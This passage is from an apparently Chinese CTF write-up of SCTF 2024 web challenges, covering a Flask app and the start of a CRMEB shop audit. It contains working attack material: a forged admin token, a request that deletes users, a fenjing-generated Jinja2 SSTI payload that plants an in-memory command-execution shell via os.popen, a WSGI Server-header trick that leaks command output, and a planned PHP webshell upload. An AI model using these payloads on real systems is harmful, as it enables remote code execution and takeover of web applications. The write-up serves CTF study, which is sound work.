verify_c <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>secret<span class="token punctuation">,</span> key<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span>
infor <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"aaa"</span><span class="token punctuation">,</span> <span class="token string">"secret"</span><span class="token punctuation">:</span> verify_c<span class="token punctuation">&#125;</span>
token <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>infor<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是这时候登录进去会报错，因为用户溢出了，得先删掉几个用户</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/removeUser</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">1.95.87.193:36183</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://1.95.87.193:36183/register</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://1.95.87.193:36183</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">Token=eyJuYW1lIjogImFhYSIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXRmhJaXdpYVhOZllXUnRhVzRpT2lJeEluMC43RlZYSHppMEZvY2NMRmFJdWlOMUx3S0p4WmdJT3RTRTEweGxFOTBBa3FNIn0=</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">14</span></span>

username=test§1§<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样就能访问&#x2F;admin了</p>
<p>现在就是打ssti了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">template <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"code"</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> result <span class="token operator">!=</span> <span class="token string">"True"</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> result<span class="token punctuation">,</span> <span class="token number">401</span>
<span class="token comment">#just only blackList</span>
<span class="token keyword">if</span> waf<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"Hacker Found"</span>
result<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
<span class="token keyword">if</span> result <span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"OK"</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"error"</span>

evilcode<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"\\"</span><span class="token punctuation">,</span>
          <span class="token string">"&#123;%"</span><span class="token punctuation">,</span>
          <span class="token string">"config"</span><span class="token punctuation">,</span>
          <span class="token string">"session"</span><span class="token punctuation">,</span>
          <span class="token string">"request"</span><span class="token punctuation">,</span>
          <span class="token string">"self"</span><span class="token punctuation">,</span>
          <span class="token string">"url_for"</span><span class="token punctuation">,</span>
          <span class="token string">"current_app"</span><span class="token punctuation">,</span>
          <span class="token string">"get_flashed_messages"</span><span class="token punctuation">,</span>
          <span class="token string">"lipsum"</span><span class="token punctuation">,</span>
          <span class="token string">"cycler"</span><span class="token punctuation">,</span>
          <span class="token string">"joiner"</span><span class="token punctuation">,</span>
          <span class="token string">"namespace"</span><span class="token punctuation">,</span>
          <span class="token string">"chr"</span><span class="token punctuation">,</span>
          <span class="token string">"request."</span><span class="token punctuation">,</span>
          <span class="token string">"|"</span><span class="token punctuation">,</span>
          <span class="token string">"%c"</span><span class="token punctuation">,</span>
          <span class="token string">"eval"</span><span class="token punctuation">,</span>
          <span class="token string">"["</span><span class="token punctuation">,</span>
          <span class="token string">"]"</span><span class="token punctuation">,</span>
          <span class="token string">"exec"</span><span class="token punctuation">,</span>
          <span class="token string">"pop("</span><span class="token punctuation">,</span>
          <span class="token string">"get("</span><span class="token punctuation">,</span>
          <span class="token string">"setdefault"</span><span class="token punctuation">,</span>
          <span class="token string">"getattr"</span><span class="token punctuation">,</span>
          <span class="token string">":"</span><span class="token punctuation">,</span>
          <span class="token string">"os"</span><span class="token punctuation">,</span>
          <span class="token string">"app"</span><span class="token punctuation">]</span>
whiteList<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> s<span class="token punctuation">.</span>isascii<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> key <span class="token keyword">in</span> evilcode<span class="token punctuation">:</span>
            <span class="token keyword">if</span> key <span class="token keyword">in</span> s<span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>过滤一堆，直接fenjing打内存马</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> fenjing
<span class="token keyword">import</span> logging

<span class="token keyword">import</span> requests

logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>

payload <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
[
    app.view_functions
    for app in [ __import__('sys').modules["__main__"].app ]
    for c4tchm3 in [
        lambda resp: [
            resp
            for cmd_result in [__import__('os').popen(__import__('__main__').app.jinja_env.globals["request"].args.get("cmd", "id")).read()]
            if [
                resp.headers.__setitem__("Aaa", __import__("base64").b64encode(cmd_result.encode()).decode()),
                print(resp.headers["Aaa"])
            ]
        ][0]
    ]
    if [
        app.__dict__.update(&#123;'_got_first_request':False&#125;),
        app.after_request_funcs.setdefault(None, []).append(c4tchm3)
    ]
]
"""</span>


<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    blacklist <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">"&#123;%"</span><span class="token punctuation">,</span> <span class="token string">"config"</span><span class="token punctuation">,</span> <span class="token string">"session"</span><span class="token punctuation">,</span> <span class="token string">"request"</span><span class="token punctuation">,</span> <span class="token string">"self"</span><span class="token punctuation">,</span> <span class="token string">"url_for"</span><span class="token punctuation">,</span>
        <span class="token string">"current_app"</span><span class="token punctuation">,</span> <span class="token string">"get_flashed_messages"</span><span class="token punctuation">,</span> <span class="token string">"lipsum"</span><span class="token punctuation">,</span> <span class="token string">"cycler"</span><span class="token punctuation">,</span> <span class="token string">"joiner"</span><span class="token punctuation">,</span>
        <span class="token string">"namespace"</span><span class="token punctuation">,</span> <span class="token string">"chr"</span><span class="token punctuation">,</span> <span class="token string">"request."</span><span class="token punctuation">,</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token string">"exec"</span><span class="token punctuation">,</span>
        <span class="token string">"pop("</span><span class="token punctuation">,</span> <span class="token string">"get("</span><span class="token punctuation">,</span> <span class="token string">"setdefault"</span><span class="token punctuation">,</span> <span class="token string">"getattr"</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"app"</span>
    <span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token builtin">all</span><span class="token punctuation">(</span>word <span class="token keyword">not</span> <span class="token keyword">in</span> s <span class="token keyword">for</span> word <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span>


full_payload_gen <span class="token operator">=</span> fenjing<span class="token punctuation">.</span>FullPayloadGen<span class="token punctuation">(</span>waf<span class="token punctuation">)</span>
payload<span class="token punctuation">,</span> will_print <span class="token operator">=</span> full_payload_gen<span class="token punctuation">.</span>generate<span class="token punctuation">(</span>
    fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>EVAL<span class="token punctuation">,</span> <span class="token punctuation">(</span>fenjing<span class="token punctuation">.</span>const<span class="token punctuation">.</span>STRING<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token keyword">not</span> will_print<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"这个payload不会产生回显"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    <span class="token string">"http://1.95.87.193:36183/admin"</span><span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>
        <span class="token string">"Token"</span><span class="token punctuation">:</span> <span class="token string">"eyJuYW1lIjogImFhYSIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXRmhJaXdpYVhOZllXUnRhVzRpT2lJeEluMC43RlZYSHppMEZvY2NMRmFJdWlOMUx3S0p4WmdJT3RTRTEweGxFOTBBa3FNIn0="</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意这里把eval删了，我们可以用<code>exec</code>代替</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">del</span> __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003144013749.png" alt="image-20241003144013749"></p>
<p>根目录下有&#x2F;readflag</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003144300979.png" alt="image-20241003144300979"></p>
<p>flag：<code>SCTF&#123;3zRe0der_1s_Rea1lyEz@h4veFun1nSCTF!!&#125;</code></p>
<br>

<h2 id="预期：WSGI带出回显"><a href="#预期：WSGI带出回显" class="headerlink" title="预期：WSGI带出回显"></a>预期：WSGI带出回显</h2><p>在响应包中存在一个 Server 头</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20250122001212775.png" alt="image-20250122001212775"></p>
<p>对应源码</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20250122001125820.png" alt="image-20250122001125820"></p>
<p>其中的 version_string 就是返回的信息</p>
<p>然后 version_string 有两部分 server_version 和 sys_version</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20250122001315833.png" alt="image-20250122001315833"></p>
<p>这两个值是 WSGIRequestHandler 类中的属性，我们可以更改环境中的 server_version 或者是 sys_version 的的值，以导致后续的请求头中的Server都是我们所更改的值</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">g<span class="token punctuation">.</span>pop<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">setattr</span><span class="token punctuation">(</span>g<span class="token punctuation">.</span>pop<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>werkzeug<span class="token punctuation">.</span>serving<span class="token punctuation">.</span>WSGIRequestHandler<span class="token punctuation">,</span><span class="token string">"server_version"</span><span class="token punctuation">,</span>g<span class="token punctuation">.</span>pop<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<hr>
<h1 id="Simpleshop（复现）"><a href="#Simpleshop（复现）" class="headerlink" title="Simpleshop（复现）"></a>Simpleshop（复现）</h1><blockquote>
<p>hint1: the ultimate goal is to enable rce to read the contents of the &#x2F;flag file.<br>hint2: the foreground user can achieve rce and background has nothing to do, so it is pointless to break the background password.<br>hint3: source code on github&#x2F;gitee latest version you can try to audit it<br><a target="_blank" rel="noopener" href="https://gitee.com/ZhongBangKeJi/CRMEB">https://gitee.com/ZhongBangKeJi/CRMEB</a><br><a target="_blank" rel="noopener" href="https://github.com/crmeb/CRMEB">https://github.com/crmeb/CRMEB</a></p>
</blockquote>
<p>是个CRMEB，基于thinkphp的，php7.4</p>
<p>robots.txt：<code>/A_letter_to_ctfer.html</code></p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Dear Friend:

I hope you are well! I just want to write this letter to ask for your help, recently my e-shopping site has been hacked, but I have disabled almost all the dangerous functions of php, and does some common php security restrictions,but there are still some problems.

In order to facilitate your test, you can through the /register.html registration of the front user, add users should not be harmful it

Can you help me to find out the problem,I'd appreciate it.I hope you are doing well!

I highly recommend you test it locally first, it will simplify the problem.

Good luck!

Your friend J1rrY<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>去 &#x2F;register.html 注册一个账户登录一下看看</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003220158443.png" alt="image-20241003220158443"></p>
<p>有一个上传头像的接口，看一下</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003220430354.png" alt="image-20241003220430354"></p>
<p>对应的代码</p>
<p>crmeb&#x2F;app&#x2F;api&#x2F;controller&#x2F;v1&#x2F;PublicController.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**
     * 图片上传
     * @param Request $request
     * @param SystemAttachmentServices $services
     * @return mixed
     */</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_image</span><span class="token punctuation">(</span><span class="token class-name type-declaration">Request</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token class-name type-declaration">SystemAttachmentServices</span> <span class="token variable">$services</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">postMore</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
        <span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'json'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">100100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name static-context">CacheService</span><span class="token operator">::</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'start_uploads_'</span> <span class="token operator">.</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">uid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">CacheService</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'start_uploads_'</span> <span class="token operator">.</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">uid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'json'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">100101</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token class-name static-context">UploadService</span><span class="token operator">::</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">to</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'store/comment'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">move</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$info</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'json'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">fail</span><span class="token punctuation">(</span><span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$upload</span><span class="token operator">-></span><span class="token function">getUploadInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$services</span><span class="token operator">-></span><span class="token function">attachmentAdd</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'thumb_path'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token function">sys_config</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'upload_type'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name static-context">CacheService</span><span class="token operator">::</span><span class="token function">has</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'start_uploads_'</span> <span class="token operator">.</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">uid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token variable">$start_uploads</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token class-name static-context">CacheService</span><span class="token operator">::</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'start_uploads_'</span> <span class="token operator">.</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">uid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">else</span>
        <span class="token variable">$start_uploads</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token variable">$start_uploads</span><span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token class-name static-context">CacheService</span><span class="token operator">::</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'start_uploads_'</span> <span class="token operator">.</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">uid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$start_uploads</span><span class="token punctuation">,</span> <span class="token number">86400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">path_to_url</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'http'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$request</span><span class="token operator">-></span><span class="token function">domain</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'json'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">success</span><span class="token punctuation">(</span><span class="token number">100009</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span> <span class="token operator">=></span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'url'</span> <span class="token operator">=></span> <span class="token variable">$res</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>尝试直接上传php马，发现有后缀检测，找一下规则</p>
<p>crmeb&#x2F;config&#x2F;upload.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//上传文件后缀类型</span>
<span class="token string single-quoted-string">'fileExt'</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'pem'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mp3'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'wma'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'wav'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'amr'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mp4'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'key'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'xlsx'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'xls'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ico'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
<span class="token comment">//上传文件类型</span>
<span class="token string single-quoted-string">'fileMime'</span> <span class="token operator">=></span> <span class="token punctuation">[</span>
    <span class="token string single-quoted-string">'image/jpg'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'text/plain'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'audio/mpeg'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'video/mp4'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'application/octet-stream'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'</span><span class="token punctuation">,</span>
